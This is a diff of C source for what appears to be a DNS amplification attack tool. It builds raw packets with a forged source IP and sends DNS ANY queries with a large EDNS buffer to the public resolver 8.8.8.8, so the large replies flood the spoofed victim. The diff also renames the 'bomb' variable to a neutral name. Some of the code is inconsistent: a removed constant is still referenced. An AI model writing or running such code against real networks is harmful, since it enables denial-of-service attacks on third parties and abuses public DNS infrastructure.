@@ -12,10 +12,8 @@
 
 
 /* Define settings */
-#define DEFAULT_SPOOF_ADDR  "127.0.0.1"
-#define DEFAULT_DOMAIN      "www.nctu.edu.tw"
-#define DEFAULT_DNS_PORT    53
-#define DEFAULT_LOOPS       10000
+#define DNS_Server "8.8.8.8"
+#define DOMAIN      "www.nctu.edu.tw"
 
 
 /* Initialize global varible */
@@ -125,38 +123,38 @@ unsigned short Checksum(unsigned short *addr, int len)
 
 
 /* build and fill in ip header */
-Trash *Build_IP_Header(Trash *bomb)
+Trash *Build_IP_Header(Trash *a)
 {
-    bomb->ip = (struct iphdr *) bomb->packet;
+    a->ip = (struct iphdr *) a->packet;
 
-    bomb->ip->version = 4;
-    bomb->ip->ihl = 5;
-    bomb->ip->id = htonl(rand());
-    bomb->ip->saddr = inet_addr(spoof_address);
-    bomb->ip->daddr = inet_addr("8.8.8.8");
-    bomb->ip->ttl = 64;
-    bomb->ip->tos = 0;
-    bomb->ip->frag_off = 0;
-    bomb->ip->protocol = IPPROTO_UDP;
-    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header) + 
+    a->ip->version = 4;
+    a->ip->ihl = 5;
+    a->ip->id = htonl(rand());
+    a->ip->saddr = inet_addr(spoof_address);
+    a->ip->daddr = inet_addr(DNS_Server);
+    a->ip->ttl = 64;
+    a->ip->tos = 0;
+    a->ip->frag_off = 0;
+    a->ip->protocol = IPPROTO_UDP;
+    a->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header) + 
                               sizeof(DNS_query) + sizeof(DNS_opt) + strlen(DEFAULT_DOMAIN) + 1);
-    bomb->ip->check = Checksum((unsigned short *) bomb->ip, sizeof(struct iphdr));
+    a->ip->check = Checksum((unsigned short *) a->ip, sizeof(struct iphdr));
 
-    return bomb;
+    return a;
 }
 
 
 /* build and fill in udp header */
-Trash *Build_UDP_Header(Trash *bomb)
+Trash *Build_UDP_Header(Trash *a)
 {
-    bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));
+    a->udp = (struct udphdr *) (a->packet + sizeof(struct iphdr));
 
-    bomb->udp->source = htons(rand());
-    bomb->udp->dest = htons(spoof_ip);
-    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DEFAULT_DOMAIN) + 1);
-    bomb->udp->check = 0;
+    a->udp->source = htons(rand());
+    a->udp->dest = htons(spoof_ip);
+    a->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DEFAULT_DOMAIN) + 1);
+    a->udp->check = 0;
 
-    return bomb;
+    return a;
 }
 
 
@@ -182,48 +180,49 @@ void DNS_Format(char *qname, char *host)
 
 
 /* build and fill in dns request */
-Trash *DNS_Request(Trash *bomb)
+Trash *DNS_Request(Trash *a)
 {
     char *qname = NULL;
 
-    bomb->dns = (DNS_header *) (bomb->packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+    a->dns = (DNS_header *) (a->packet + sizeof(struct iphdr) + sizeof(struct udphdr));
 
-    bomb->dns->id = (unsigned short) htons(getpid());
-    bomb->dns->qr = 0;
-    bomb->dns->opcode = 0;
-    bomb->dns->aa = 0;
-    bomb->dns->tc = 0;
-    bomb->dns->rd = 1;
-    bomb->dns->ra = 0;
-    bomb->dns->z = 0;
-    bomb->dns->ad = 0;
-    bomb->dns->cd = 0;
-    bomb->dns->rcode = 0;
-    bomb->dns->q_count = htons(1);
-    bomb->dns->ans_count = 0;
-    bomb->dns->auth_count = 0;
-    bomb->dns->add_count = htons(1);
+    a->dns->id = (unsigned short) htons(getpid());
+    a->dns->qr = 0;
+    a->dns->opcode = 0;
+    a->dns->aa = 0;
+    a->dns->tc = 0;
+    a->dns->rd = 1;
+    a->dns->ra = 0;
+    a->dns->z = 0;
+    a->dns->ad = 0;
+    a->dns->cd = 0;
+    a->dns->rcode = 0;
+    a->dns->q_count = htons(1);
+    a->dns->ans_count = 0;
+    a->dns->auth_count = 0;
+    a->dns->add_count = htons(1);
 
-    qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
+    qname = &a->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
         sizeof(DNS_header)];
     /*job->domain = "www.google.com.";*/
     DNS_Format(qname, DEFAULT_DOMAIN);
 
-    bomb->query = (DNS_query *) &bomb->packet[sizeof(struct iphdr) + 
+    a->query = (DNS_query *) &a->packet[sizeof(struct iphdr) + 
         sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname) + 1)];
 
-    bomb->query->qtype = htons(255);
-    bomb->query->qclass = htons(1);
-    bomb->opt = (DNS_opt*)(bomb->packet + sizeof(struct iphdr) + 
+    a->query->qtype = htons(255);
+    a->query->qclass = htons(1);
+    a->opt = (DNS_opt*)(a->packet + sizeof(struct iphdr) + 
                            sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname)) + sizeof(DNS_query) + 1);
-    bomb->opt->name = 0;
-    bomb->opt->type  =htons(41) ;
-    bomb->opt->udplength =htons(4096);
-    bomb->opt->rcode = 0;
-    bomb->opt->ednsversion = 0;
-    bomb->opt->Z = htons(0x8000);
-    bomb->opt->datalength = 0;
-    return bomb;
+    a->opt->name = 0;
+    a->opt->type  =htons(41) ;
+    a->opt->udplength =htons(4096);
+    a->opt->rcode = 0;
+    a->opt->ednsversion = 0;
+    a->opt->Z = htons(0x8000);
+    a->opt->datalength = 0;
+
+    return a;
 }
 
 Trash *Build_Packet(Trash *a, int c)
